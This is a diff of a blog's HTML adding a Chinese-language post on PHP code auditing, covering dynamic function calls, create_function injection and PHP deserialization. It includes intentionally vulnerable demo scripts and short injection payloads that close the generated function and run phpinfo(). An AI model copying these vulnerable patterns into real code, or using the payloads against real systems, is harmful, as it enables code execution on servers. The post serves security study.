@@ -183,7 +183,7 @@
                 
                 <section class="switch-part switch-part2">
                     <div class="widget tagcloud" id="js-tagcloud">
-                        <a href="/tags/PE%E7%BB%93%E6%9E%84/" style="font-size: 20px;">PE结构</a> <a href="/tags/ctf/" style="font-size: 10px;">ctf</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 10px;">域渗透</a>
+                        <a href="/tags/PE%E7%BB%93%E6%9E%84/" style="font-size: 20px;">PE结构</a> <a href="/tags/ctf/" style="font-size: 10px;">ctf</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 15px;">代码审计</a> <a href="/tags/%E5%85%8D%E6%9D%80/" style="font-size: 10px;">免杀</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 10px;">域渗透</a>
                     </div>
                 </section>
                 
@@ -247,6 +247,699 @@
     </div>
 </nav>
       <div class="body-wrap">
+  
+    <article id="post-PHP代码审计学习-3" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2021/10/25/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-3/" class="article-date">
+      <time datetime="2021-10-25T04:37:09.000Z" itemprop="datePublished">2021-10-25</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2021/10/25/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-3/">PHP代码审计学习-3</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h3 id="动态函数执行和匿名函数执行"><a href="#动态函数执行和匿名函数执行" class="headerlink" title="动态函数执行和匿名函数执行"></a>动态函数执行和匿名函数执行</h3><h4 id="动态函数执行"><a href="#动态函数执行" class="headerlink" title="动态函数执行"></a>动态函数执行</h4><p>函数与函数之间的调用，可能会产生漏洞。</p>
+<p>测试demo</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;a&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;b&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">c</span>(<span class="params"><span class="variable">$args1</span>,<span class="variable">$args2</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$args1</span>(<span class="variable">$args2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$action</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">c(<span class="variable">$action</span>,<span class="variable">$cmd</span>);</span><br><span class="line"><span class="comment">//浏览器获取到的值 b ，现在作为 c() 函数的参数插入到了函数中，并且在函数中作为函数名调用了另外一个函数</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-3.assets/image-20211025160512247.png" alt="image-20211025160512247"></p>
+<p>利用<code>$action</code>、<code>$cmd</code> 动态传递参数，执行命令</p>
+<h4 id="匿名函数-Anonymous-functions"><a href="#匿名函数-Anonymous-functions" class="headerlink" title="匿名函数(Anonymous functions)"></a>匿名函数(Anonymous functions)</h4><p>也被称之为闭包函数(closures)，允许临时创建一个没有指定名称的函数。最经常用作回调函数(callback)参数的值</p>
+<p>测试demo</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$sort_by</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;sort_by&#x27;</span>]; <span class="comment">//GET方式传入值</span></span><br><span class="line"><span class="variable">$sorter</span> = <span class="string">&#x27;strnatcasecmp&#x27;</span>; <span class="comment">//strnatcasecmp 用于 比较字符串大小</span></span><br><span class="line"><span class="variable">$databases</span>=<span class="keyword">array</span>(<span class="string">&#x27;1234&#x27;</span>,<span class="string">&#x27;4321&#x27;</span>);</span><br><span class="line"><span class="variable">$sort_function</span> = <span class="string">&#x27; return 1 * &#x27;</span> . <span class="variable">$sorter</span> . <span class="string">&#x27;($a[&quot;&#x27;</span> . <span class="variable">$sort_by</span> . <span class="string">&#x27;&quot;], $b[&quot;&#x27;</span> . <span class="variable">$sort_by</span> . <span class="string">&#x27;&quot;]);&#x27;</span>; <span class="comment">//return 1*(0/1)</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;this is test&#x27;</span>;</span><br><span class="line">usort(<span class="variable">$databases</span>, create_function(<span class="string">&#x27;$a, $b&#x27;</span>, <span class="variable">$sort_function</span>)); <span class="comment">//此处创建一个匿名函数 $a $b作为参数传给$sort_function</span></span><br><span class="line"><span class="comment">//// 匿名函数相当于隐式函数大概内内部是如此，我们可以将传参的$sort_by 做一些处理，比如说闭合，使其能拼接执行恶意代码</span></span><br><span class="line"><span class="comment">//function xxx($a,$b)&#123;</span></span><br><span class="line"><span class="comment">//    return 1*strnatcasecmp($a[&quot;&quot;]);&#125;phpinfo();/*,$b[&#x27;2&#x27;]);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//echo &#x27;nayon&#x27;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>匿名函数create_function()在其中创建的函数大概为如下所示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function xxx($a,$b)&#123;</span><br><span class="line">    return 1*strnatcasecmp($a[&quot;1&quot;],$b[&#x27;2&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;nayon&#x27;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>利用<code>&#125;</code>闭合匿名函数，继续写上恶意代码，然后再/*注释掉垃圾字符。</p>
+<p>由此我们可以拼接出利用payload:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sort_by=<span class="string">&#x27;&quot;]);&#125;phpinfo();/*</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-3.assets/image-20211025163501429.png" alt="image-20211025163501429"></p>
+<p>测试demo：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="variable">$lambda</span>=create_function(<span class="string">&#x27;$a,$b&#x27;</span>,<span class="string">&quot;return (strlen(<span class="subst">$a</span>)-strlen(<span class="subst">$b</span>)+&quot;</span> . <span class="string">&quot;strlen(<span class="subst">$c</span>));&quot;</span>);</span><br><span class="line"><span class="variable">$array</span>=<span class="keyword">array</span>(<span class="string">&#x27;reall long string here,boy&#x27;</span>,<span class="string">&#x27;this&#x27;</span>,<span class="string">&#x27;midding lenth&#x27;</span>,<span class="string">&#x27;larget&#x27;</span>);</span><br><span class="line">usort(<span class="variable">$array</span>,<span class="variable">$lambda</span>);</span><br><span class="line">print_r(<span class="variable">$array</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>$c</code>处未存在过滤,可构造payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload1:3));&#125;phpinfo();/* #/用于注释多出的));以及匿名函数所会生成的&#125;</span><br><span class="line">payload2:3));&#125;phpinfo();&#123;((1 #利用&#123; 和((将多出的字符闭合</span><br></pre></td></tr></table></figure>
+
+<p>匿名函数中大概这样，进行执行phpinfo</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">niming</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="variable">$b</span>=<span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">    <span class="variable">$c</span>=<span class="string">&#x27;3&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> (strlen(<span class="variable">$a</span>)-strlen(<span class="variable">$b</span>)+strlen(<span class="number">1</span>));&#125;</span><br><span class="line">phpinfo();&#123;</span><br><span class="line">    ((<span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-3.assets/image-20211025164600761.png" alt="image-20211025164600761"></p>
+<h3 id="PHP反序列化学习"><a href="#PHP反序列化学习" class="headerlink" title="PHP反序列化学习"></a>PHP反序列化学习</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>php程序为了保存和转储对象，提供了序列化的方法。php序列化是为了在程序运行的过程中对对象进行转储而产生的。<code>序列化可以将对象转换成字符串，但仅保留对象里的成员变量，不保存函数方法</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php序列化的函数为serialize 可以将对象中的成员变量转换成字符串。</span><br><span class="line">php反序列化的函数为unserialize  可以将序列化生成的字符串重新还原为对象中的成员变量。</span><br></pre></td></tr></table></figure>
+
+<p><code>将用户可控的数据进行反序列化</code> 就是所谓的php反序列化漏洞</p>
+<h5 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h5><p>序列化的目的是方便数据的传输与储存。</p>
+<p>php应用中，序列化和反序列化一般用做缓存，比如session缓存，cookie缓存等。</p>
+<p>常见的序列化格式：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">二进制格式</span><br><span class="line">字节数组</span><br><span class="line">json字符串</span><br><span class="line">xml字符串</span><br></pre></td></tr></table></figure>
+
+<p>序列化测试demo</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;This is A&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$b</span> = <span class="string">&quot;This is B&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$c</span> = <span class="string">&quot;This is C&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;this is test1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span>=<span class="keyword">new</span> test();</span><br><span class="line">var_dump(serialize(<span class="variable">$test</span>));</span><br></pre></td></tr></table></figure>
+
+<p>输出值:</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:\phpstudy_pro\WWW\phplearn\global.php:<span class="number">11</span>:string &#x27;O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;This is A&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;�*�b&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;This is B&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;�test�c&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;This is C&quot;</span>;&#125;&#x27; (length=<span class="number">96</span>)</span><br></pre></td></tr></table></figure>
+
+<p>实际上的序列化字符串</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;This is A&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;�*�b&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;This is B&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;�test�c&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;This is C&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>序列化字符串结构</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:对象名的长度:<span class="string">&quot;对象名&quot;</span>:对象属性个数:&#123;s[属性的类型，字符串s 整型i....]:属性名的长度:<span class="string">&quot;属性名&quot;</span>;s:属性值的长度:<span class="string">&quot;属性值&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看出来，序列化后，共有3个属性在序列化字符串中，函数方法test1未能进行序列化</p>
+<p>序列化后的结果是字符串string</p>
+<p>test是一个类，new test()代表创建test类的对象</p>
+<p>O表示对象，4表示类名共有4个字符长 ，test是类的名称</p>
+<p>3是序列化对象中共有三个成员变量。括号內部依序是<code>类型、名称、值</code>,同时变量与变量之间由分号隔开</p>
+<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-3.assets/image-20211025174739757.png" alt="image-20211025174739757"></p>
+<p>在这其中，a是public类型变量、s表示字符串、1表示变量名长度，a是变量名。</p>
+<p>b是protected类型的变量，它的变量名长度为4，也就是在名字前加上了%00*%00变为了<code>%00*%00b</code> ,所以我们可以得知protected属性的表示方法是在变量名前加上<code>%00*%00</code></p>
+<p>c是private类型的变量，c的变量名前加上类%00类名%00变量名 即<code>%00类%00c</code>表名此是私有变量</p>
+<p>虽说在test类中存在test1方法，但php序列化中，并不会保存方法。</p>
+<h5 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;This is A&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$b</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$c</span> = <span class="string">&quot;This is C&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;this is test1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span>=<span class="keyword">new</span> test();</span><br><span class="line">var_dump(<span class="variable">$e</span> = serialize(<span class="variable">$test</span>)); <span class="comment">//打印输出序列化字符串</span></span><br><span class="line"></span><br><span class="line">var_dump(unserialize(<span class="variable">$e</span>)); <span class="comment">//反序列化字符串</span></span><br></pre></td></tr></table></figure>
+
+<p>打印输出:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">object</span>(test)<span class="comment">#2 (3) &#123;</span></span><br><span class="line">  [<span class="string">&quot;a&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;This is A&quot;</span></span><br><span class="line">  [<span class="string">&quot;b&quot;</span>:<span class="keyword">protected</span>]=&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">1</span>)</span><br><span class="line">  [<span class="string">&quot;c&quot;</span>:<span class="string">&quot;test&quot;</span>:<span class="keyword">private</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;This is C&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，类的成员变量被还原，它们是否公有、私有、保护的类型也得到正确的表示。</p>
+<h5 id="在php中所能用到的魔术方法"><a href="#在php中所能用到的魔术方法" class="headerlink" title="在php中所能用到的魔术方法"></a>在php中所能用到的魔术方法</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php类可能会包含魔术方法，魔术方法命名都是以`__`开始，例如 `__construct`，`__destruct`,`__toString`,`__sleep`,`__wakeup`，魔法函数在某些情况下会自动调用</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__construct(): 有构造函数的类会在每次创建新对象时先调用此方法。</span><br><span class="line">__destruct():析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</span><br><span class="line">__toString():一个类被当成字符串时应该如何回应，例如echo $obj打印类时，若存在__toString魔法函数，将会自动调用.</span><br><span class="line">__sleep(): 在一个对象被序列化之前调用</span><br><span class="line">__wakeup():unserialize()会检查是否存在一个_wakeup()方法。如果存在，则会首先调用__wakeup方法，为对象进行处理。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__construct() #当对象被创建时调用</span><br><span class="line">__destruct() #当对象被销毁时调用</span><br><span class="line">__toString() #当对象被当做字符串时使用</span><br><span class="line">__sleep() #在对象被序列化之前调用</span><br><span class="line">__wakeup() #在对象unserialize()之前进行调用</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Content-Type:text/html;charset=UTF-8&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;construct run&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;destruct run&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;toString run&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;str&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;sleep run&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;wakeup run&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//类被实现时，php首先检测类中是否存在__construct方法，存在先执行其魔术方法再实现</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;new了一个对象，对象被创建，执行__construct&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> Test();</span><br><span class="line"></span><br><span class="line"><span class="comment">//序列化之前检查类中是否存在__sleep()</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;serialize了一个对象，对象被序列化，先执行__sleep，再序列化&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$sTest</span> = serialize(<span class="variable">$test</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//__wakeup()在反序列化之间执行</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;__wakeup():unserialize( )会检查是否存在一个_wakeup( )方法。如果存在，则会先调用_wakeup方法，预先准备对象需要的资源。&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$usTest</span> = unserialize(<span class="variable">$sTest</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//当对象被当做字符串使用时，__toString方法被触发，执行其中内容</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;把Test对象当做字符串使用，执行__toString&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;use Test obj as str &#x27;</span>.<span class="variable">$test</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//程序执行完毕，对象销毁释放，执行__destruct方法.</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;程序执行完毕，对象自动销毁，执行__destruct&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-3.assets/image-20211025195535420.png" alt="image-20211025195535420"></p>
+<h5 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h5><p>攻击者可以操纵unserialize的参数，以构造恶意的序列化字符串，当应用程序将恶意字符串反序列化为对象后，恶意代码得以执行，这就造成了php反序列化漏洞。</p>
+<p>demo:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$target</span> = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;target = <span class="string">&#x27;wakeup!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$fp</span> = fopen(<span class="string">&quot;D:\\phpstudy_pro\\WWW\\phplearn\\webshell.php&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        fputs(<span class="variable">$fp</span>,<span class="keyword">$this</span>-&gt;target);</span><br><span class="line">        fclose(<span class="variable">$fp</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;destruct complate&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> A);</span><br><span class="line"><span class="variable">$test</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="variable">$test_unseria</span> = unserialize(<span class="variable">$test</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;webshell.php&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;.\webshell.php&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>利用echo ，拿到序列化后的恶意字符串，通过test传参进入</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;target&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;&#125;</span><br><span class="line">?test=O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;target&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
